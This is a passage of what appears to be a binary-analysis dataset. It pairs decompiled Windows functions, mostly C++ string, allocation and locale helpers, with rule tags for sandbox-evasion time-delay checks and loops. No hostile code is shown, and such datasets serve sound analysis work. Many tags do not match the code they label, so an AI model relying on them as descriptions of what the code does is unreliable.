0xb8b1aabcbcd4d500U < 2) {\n                iVar2 = *(piVar8 + -5);\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                }\n                *(piVar8 + -5) = iVar2 + 1;\n                *(ppiVar9 + 1) = *(ppiVar9 + 1) + -1;\n                if (piStack240 != piVar1) {\n                    piVar8[-6] = piStack240;\n                    *ppiVar9 = piVar1;\n                }\n                return piVar8[-1];\n            }\n            if (piStack240 == NULL) {\n                *ppiVar9 = piVar1;\n                return NULL;\n            }\n            fcn.1400b8f90();\n            if ((piStack240 == NULL) || (fcn.1400bc860(piStack240),  1 < *piStack240 + 0xb8b1aabcbcd4d500U)) {\n                fcn.1400b8f90();\n            }\n            iVar12 = piStack240[-7];\n            fcn.14001f750();\n            fcn.1400bc860(iVar12);\n            uStack272 = *(iVar12 + -0x10);\n            arg2_00 = *(iVar12 + -0x18);\n            iVar2 = *(iVar12 + -0x24);\n            uVar3 = *(iVar12 + -0x38);\n            arg1 = fcn.14001f770(*(iVar12 + -0x40));\n            fcn.1400bc860(arg1);\n            piVar8 = fcn.1400bcb70();\n            puVar6 = *piVar8;\n            if ((*(puVar6 + 10) & 1) == 0) goto code_r0x0001400bc9da;\n            puVar6 = *puVar6;\n            while( true ) {\n                fcn.14001f340(0, arg2_00, auStack288);\n                cVar4 = fcn.14001f430(auStack288, puVar6[-0x12], puVar6, iVar2);\n                if (cVar4 != '\\0') break;\n                puVar6 = 0x140112960;\n                cVar4 = fcn.14001f430(auStack288, 0x140112960, 0, iVar2);\n                if (cVar4 == '\\0') goto code_r0x0001400bc9fd;\n                piVar8 = fcn.1400bc7f0(8);\n                *piVar8 = *0x1401104c0 + 0x10;\n                fcn.1400bcdb0(piVar8, 0x140112960, 0x1400892d0);\ncode_r0x0001400bc9da:\n                puVar6 = puVar6 + 0x12;\n            }\n            fcn.1400bcd60();\ncode_r0x0001400bc9fd:\n            fcn.14001f750(uVar3);\n            ppiVar9 = fcn.1400bcb60();\n            piVar8 = *ppiVar9;\n            if (piVar8 != NULL) {\n                if ((*(piVar8 + 10) & 1) != 0) {\n                    piVar8 = *piVar8 + -0x90;\n                }\n                piVar8 = *piVar8;\n            }\n            return piVar8;\n        }\n    }\n    *puVar6 = 0;\n    puVar6[0x11] = 0;\n    puVar11 = puVar6 + 1 & 0xfffffffffffffff8;\n    for (uVar10 = (puVar6 - (puVar6 + 1 & 0xfffffffffffffff8)) + 0x90U >> 3; uVar10 != 0; uVar10 = uVar10 - 1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    return puVar6;\n}\n",
        "token_count": 1717
    },
    "1400a957": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a9570(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    *arg1 = arg1 + 2;\n    piVar1 = arg2 + 2;\n    iVar2 = arg2[1];\n    if (piVar1 == *arg2) {\n        iVar3 = -1;\n        if (iVar2 != -1) {\n            sub.msvcrt.dll_memcpy(arg1 + 2, piVar1);\n            iVar3 = arg2[1];\n        }\n    }\n    else {\n        *arg1 = *arg2;\n        arg1[2] = arg2[2];\n        iVar3 = iVar2;\n    }\n    arg1[1] = iVar3;\n    *arg2 = piVar1;\n    arg2[1] = 0;\n    *(arg2 + 2) = 0;\n    return;\n}\n",
        "token_count": 217
    },
    "1400ac14": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400ac140(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t arg2_00;\n    \n    arg2_00 = arg1[1];\n    if (arg2 <= arg2_00) {\n        if (arg2 < arg2_00) {\n            arg1[1] = arg2;\n            *(*arg1 + arg2 * 2) = 0;\n        }\n        return;\n    }\n    fcn.1400ab0f0(arg1, arg2_00, 0, arg2 - arg2_00);\n    return;\n}\n",
        "token_count": 133
    },
    "1400acbc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400acbc0(ulong *arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    ushort *puVar3;\n    uint64_t arg3;\n    uint64_t auStackX16 [3];\n    \n    if (arg1 + 2 == *arg1) {\n        arg3 = 7;\n    }\n    else {\n        arg3 = arg1[2];\n    }\n    if (arg2 <= arg3) {\n        return;\n    }\n    auStackX16[0] = arg2;\n    puVar3 = fcn.1400ace50(arg1, auStackX16, arg3);\n    puVar2 = *arg1;\n    iVar1 = arg1[1] + 1;\n    if (arg1[1] == 0) {\n        *puVar3 = *puVar2;\n    }\n    else if (iVar1 != 0) {\n        sub.msvcrt.dll_memcpy(puVar3, puVar2, iVar1 * 2);\n    }\n    if (arg1 + 2 != puVar2) {\n        fcn.1400bc6c0(puVar2);\n    }\n    *arg1 = puVar3;\n    arg1[2] = auStackX16[0];\n    return;\n}\n",
        "token_count": 291
    },
    "1400ace5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.1400ace50(ulong noname_0, uint64_t *arg2, uint64_t arg3)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2_00;\n    ulong uVar3;\n    char cVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    code *pcVar7;\n    int64_t *piVar8;\n    int64_t **ppiVar9;\n    ulong arg1;\n    char *pcVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    ulong *puVar13;\n    uchar auStack288 [16];\n    ulong uStack272;\n    int64_t *piStack240;\n    \n    uVar11 = *arg2;\n    if (0x1fffffffffffffff < uVar11) {\n        pcVar10 = \"basic_string::_M_create\";\n        puVar6 = fcn.1400bd360(\"basic_string::_M_create\");\n        *(pcVar10 + 8) = arg2;\n        return puVar6;\n    }\n    if ((arg3 < uVar11) && (arg3 = arg3 * 2,  uVar11 < arg3)) {\n        if (0x1fffffffffffffff < arg3) {\n            iVar12 = 0x4000000000000000;\n            *arg2 = 0x1fffffffffffffff;\n            goto code_r0x0001400bc710;\n        }\n        *arg2 = arg3;\n        uVar11 = arg3;\n    }\n    iVar12 = (uVar11 + 1) * 2;\ncode_r0x0001400bc710:\n    iVar5 = 1;\n    if (iVar12 != 0) {\n        iVar5 = iVar12;\n    }\n    while( true ) {\n        puVar6 = sub.msvcrt.dll_malloc(iVar5);\n        if (puVar6 != NULL) {\n            return puVar6;\n        }\n        pcVar7 = fcn.1400b66b0();\n        if (pcVar7 == NULL) break;\n        (*pcVar7)();\n    }\n    piVar8 = fcn.1400bc7f0(8);\n    *piVar8 = *0x140110790 + 0x10;\n    fcn.1400bcdb0(piVar8, 0x1401135d0, fcn.1400b4730);\n    puVar6 = sub.msvcrt.dll_malloc(0x90);\n    if (puVar6 == NULL) {\n        iVar12 = 0x90;\n        puVar6 = fcn.140020150(0x90);\n        if (puVar6 == NULL) {\n            fcn.1400b8f90();\n            piVar8 = iVar12 + 0xa0;\n            puVar6 = sub.msvcrt.dll_malloc();\n            if ((puVar6 != NULL) || (puVar6 = fcn.140020150(piVar8),  puVar6 != NULL)) {\n                *puVar6 = 0;\n                puVar6[0x13] = 0;\n                puVar13 = puVar6 + 1 & 0xfffffffffffffff8;\n                for (uVar11 = (puVar6 - (puVar6 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar11 != 0;\n                    uVar11 = uVar11 - 1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                return puVar6 + 0x14;\n            }\n            fcn.1400b8f90();\n            ppiVar9 = fcn.1400bcb60();\n            piVar1 = piVar8 + -10;\n            piStack240 = *ppiVar9;\n            if (*piVar8 + 0xb8b1aabcbcd4d500U < 2) {\n                iVar2 = *(piVar8 + -5);\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                }\n                *(piVar8 + -5) = iVar2 + 1;\n                *(ppiVar9 + 1) = *(ppiVar9 + 1) + -1;\n                if (piStack240 != piVar1) {\n                    piVar8[-6] = piStack240;\n                    *ppiVar9 = piVar1;\n                }\n                return piVar8[-1];\n            }\n            if (piStack240 == NULL) {\n                *ppiVar9 = piVar1;\n                return NULL;\n            }\n            fcn.1400b8f90();\n            if ((piStack240 == NULL) || (fcn.1400bc860(piStack240),  1 < *piStack240 + 0xb8b1aabcbcd4d500U)) {\n                fcn.1400b8f90();\n            }\n            iVar12 = piStack240[-7];\n            fcn.14001f750();\n            fcn.1400bc860(iVar12);\n            uStack272 = *(iVar12 + -0x10);\n            arg2_00 = *(iVar12 + -0x18);\n            iVar2 = *(iVar12 + -0x24);\n            uVar3 = *(iVar12 + -0x38);\n            arg1 = fcn.14001f770(*(iVar12 + -0x40));\n            fcn.1400bc860(arg1);\n            piVar8 = fcn.1400bcb70();\n            puVar6 = *piVar8;\n            if ((*(puVar6 + 10) & 1) == 0) goto code_r0x0001400bc9da;\n            puVar6 = *puVar6;\n            while( true ) {\n                fcn.14001f340(0, arg2_00, auStack288);\n                cVar4 = fcn.14001f430(auStack288, puVar6[-0x12], puVar6, iVar2);\n                if (cVar4 != '\\0') break;\n                puVar6 = 0x140112960;\n                cVar4 = fcn.14001f430(auStack288, 0x140112960, 0, iVar2);\n                if (cVar4 == '\\0') goto code_r0x0001400bc9fd;\n                piVar8 = fcn.1400bc7f0(8);\n                *piVar8 = *0x1401104c0 + 0x10;\n                fcn.1400bcdb0(piVar8, 0x140112960, 0x1400892d0);\ncode_r0x0001400bc9da:\n                puVar6 = puVar6 + 0x12;\n            }\n            fcn.1400bcd60();\ncode_r0x0001400bc9fd:\n            fcn.14001f750(uVar3);\n            ppiVar9 = fcn.1400bcb60();\n            piVar8 = *ppiVar9;\n            if (piVar8 != NULL) {\n                if ((*(piVar8 + 10) & 1) != 0) {\n                    piVar8 = *piVar8 + -0x90;\n                }\n                piVar8 = *piVar8;\n            }\n            return piVar8;\n        }\n    }\n    *puVar6 = 0;\n    puVar6[0x11] = 0;\n    puVar13 = puVar6 + 1 & 0xfffffffffffffff8;\n    for (uVar11 = (puVar6 - (puVar6 + 1 & 0xfffffffffffffff8)) + 0x90U >> 3; uVar11 != 0; uVar11 = uVar11 - 1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    return puVar6;\n}\n",
        "token_count": 1737
    },
    "1400b60e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar * fcn.1400b60e0(uchar *arg1, ulong arg2, uint8_t *arg3, int64_t arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    int64_t iVar9;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    iVar2 = *arg3;\n    if ((*arg3 - 1 < 0x7e) && (iVar2 < in_stack_00000030 - in_stack_00000028)) {\n        iVar9 = 0;\n        uVar5 = 0;\n        do {\n            in_stack_00000030 = in_stack_00000030 - iVar2;\n            if (uVar5 < arg4 - 1U) {\n                uVar5 = uVar5 + 1;\n            }\n            else {\n                iVar9 = iVar9 + 1;\n            }\n            puVar8 = arg3 + uVar5;\n            iVar2 = *puVar8;\n        } while ((*puVar8 - 1 < 0x7e) && (iVar2 < in_stack_00000030 - in_stack_00000028));\n        iVar2 = iVar9 + -1;\n        uVar7 = uVar5 - 1;\n        if (in_stack_00000028 == in_stack_00000030) goto joined_r0x0001400b6199;\n    }\n    else {\n        if (in_stack_00000030 == in_stack_00000028) {\n            return arg1;\n        }\n        uVar7 = 0xffffffffffffffff;\n        iVar9 = 0;\n        uVar5 = 0;\n        iVar2 = -1;\n        puVar8 = arg3;\n    }\n    iVar3 = 0;\n    do {\n        arg1[iVar3] = *(in_stack_00000028 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != in_stack_00000030 - in_stack_00000028);\n    arg1 = arg1 + iVar3;\njoined_r0x0001400b6199:\n    while (iVar3 = iVar2,  iVar9 != 0) {\n        *arg1 = arg2;\n        uVar1 = *puVar8;\n        puVar6 = arg1 + 1;\n        if ('\\0' < uVar1) {\n            uVar4 = 0;\n            do {\n                arg1[uVar4 + 1] = *(in_stack_00000030 + uVar4);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 != uVar1);\n            in_stack_00000030 = in_stack_00000030 + uVar4;\n            puVar6 = puVar6 + uVar4;\n        }\n        arg1 = puVar6;\n        iVar2 = iVar3 + -1;\n        iVar9 = iVar3;\n    }\n    while (uVar4 = uVar7,  uVar5 != 0) {\n        *arg1 = arg2;\n        uVar7 = arg3[uVar4];\n        puVar6 = arg1 + 1;\n        if ('\\0' < arg3[uVar4]) {\n            uVar5 = 0;\n            do {\n                arg1[uVar5 + 1] = *(in_stack_00000030 + uVar5);\n                uVar5 = uVar5 + 1;\n            } while (uVar7 != uVar5);\n            in_stack_00000030 = in_stack_00000030 + uVar7;\n            puVar6 = puVar6 + uVar7;\n        }\n        arg1 = puVar6;\n        uVar7 = uVar4 - 1;\n        uVar5 = uVar4;\n    }\n    return arg1;\n}\n",
        "token_count": 879
    },
    "1400b627": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nushort * fcn.1400b6270(ushort *arg1, ulong arg2, uint8_t *arg3, int64_t arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint8_t *puVar7;\n    int64_t iVar8;\n    ushort *puVar9;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    iVar4 = *arg3;\n    if ((iVar4 < in_stack_00000030 - in_stack_00000028 >> 1) && (*arg3 - 1 < 0x7e)) {\n        uVar6 = 0;\n        iVar8 = 0;\n        do {\n            in_stack_00000030 = in_stack_00000030 + iVar4 * -2;\n            if (uVar6 < arg4 - 1U) {\n                uVar6 = uVar6 + 1;\n            }\n            else {\n                iVar8 = iVar8 + 1;\n            }\n            puVar7 = arg3 + uVar6;\n            iVar4 = *puVar7;\n        } while ((iVar4 < in_stack_00000030 - in_stack_00000028 >> 1) && (*puVar7 - 1 < 0x7e));\n        iVar4 = iVar8 + -1;\n        uVar5 = uVar6 - 1;\n        if (in_stack_00000028 == in_stack_00000030) goto joined_r0x0001400b6331;\n    }\n    else {\n        if (in_stack_00000030 == in_stack_00000028) {\n            return arg1;\n        }\n        uVar5 = 0xffffffffffffffff;\n        iVar8 = 0;\n        uVar6 = 0;\n        iVar4 = -1;\n        puVar7 = arg3;\n    }\n    iVar3 = 0;\n    do {\n        *(arg1 + iVar3) = *(in_stack_00000028 + iVar3);\n        iVar3 = iVar3 + 2;\n    } while (in_stack_00000030 - in_stack_00000028 != iVar3);\n    arg1 = (in_stack_00000030 - in_stack_00000028) + arg1;\njoined_r0x0001400b6331:\n    while (iVar3 = iVar4,  iVar8 != 0) {\n        *arg1 = arg2;\n        uVar1 = *puVar7;\n        puVar9 = arg1 + 1;\n        if ('\\0' < uVar1) {\n            iVar4 = uVar1 * 2;\n            iVar8 = 0;\n            do {\n                *(arg1 + iVar8 + 2) = *(in_stack_00000030 + iVar8);\n                iVar8 = iVar8 + 2;\n            } while (iVar4 != iVar8);\n            in_stack_00000030 = in_stack_00000030 + iVar4;\n            puVar9 = puVar9 + uVar1;\n        }\n        iVar4 = iVar3 + -1;\n        arg1 = puVar9;\n        iVar8 = iVar3;\n    }\n    while (uVar2 = uVar5,  uVar6 != 0) {\n        *arg1 = arg2;\n        uVar1 = arg3[uVar2];\n        puVar9 = arg1 + 1;\n        if ('\\0' < uVar1) {\n            iVar4 = 0;\n            do {\n                *(arg1 + iVar4 + 2) = *(in_stack_00000030 + iVar4);\n                iVar4 = iVar4 + 2;\n            } while (iVar4 != uVar1 * 2);\n            in_stack_00000030 = in_stack_00000030 + iVar4;\n            puVar9 = puVar9 + iVar4;\n        }\n        uVar5 = uVar2 - 1;\n        arg1 = puVar9;\n        uVar6 = uVar2;\n    }\n    return arg1;\n}\n",
        "token_count": 902
    },
    "1400b79d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.1400b79d0(int64_t arg1, int64_t arg2, char *arg3, int64_t arg4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    bool bVar6;\n    \n    uVar4 = arg4 - 1;\n    uVar3 = arg2 - 1U;\n    if (uVar4 < arg2 - 1U) {\n        uVar3 = uVar4;\n    }\n    if (uVar3 == 0) {\n        bVar6 = true;\n    }\n    else {\n        uVar5 = 0;\n        do {\n            bVar6 = arg3[uVar4] == *(arg1 + uVar5);\n            uVar5 = uVar5 + 1;\n            uVar4 = uVar4 - 1;\n            if (uVar3 <= uVar5) break;\n        } while (bVar6);\n    }\n    cVar2 = *(arg1 + uVar3);\n    while ((uVar4 != 0 && (bVar6 != false))) {\n        pcVar1 = arg3 + uVar4;\n        uVar4 = uVar4 - 1;\n        bVar6 = *pcVar1 == cVar2;\n    }\n    if (cVar2 - 1U < 0x7e) {\n        bVar6 = bVar6 & (*arg3 == cVar2 || *arg3 < cVar2);\n    }\n    return bVar6;\n}\n",
        "token_count": 352
    },
    "1400b875": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b8750(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.14002c080(*0x14010ff30);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400bce00(uVar1, 0x140112140, 0x140113240, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 186
    },
    "1400b87b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b87b0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.14002c080(*0x14010ff40);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400bce00(uVar1, 0x140112140, 0x140113280, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 187
    },
    "1400b881": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b8810(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.14002c080(*0x1401100e0);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400bce00(uVar1, 0x140112140, 0x140113320, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 187
    },
    "1400b887": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b8870(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.14002c080(*0x1401100f0);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400bce00(uVar1, 0x140112140, 0x140113340, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 187
    },
    "1400b899": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b8990(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.14002c080(0x140108940);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400bce00(uVar1, 0x140112140, 0x1401133a0, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 187
    },
    "1400b89f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b89f0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.14002c080(0x140108950);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400bce00(uVar1, 0x140112140, 0x1401133c0, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 188
    },
    "1400b8a5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b8a50(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.14002c080(0x140108960);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400bce00(uVar1, 0x140112140, 0x1401133e0, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 188
    },
    "1400b8ab": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b8ab0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.14002c080(0x140108970);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400bce00(uVar1, 0x140112140, 0x140113400, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 186
    },
    "1400b8f9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b8f90(void)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    piVar2 = **0x14010fcb0;\n    fcn.14001f750();\n    uVar1 = fcn.14002c080(0x1401087c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112150, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401087d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112190, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401087e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401121d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401087f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112210, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108800);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401123d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108810);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401123f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108820);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112410, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108830);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112450, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108840);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112490, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108850);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401124b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108860);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401124d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108870);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108880);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108890);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 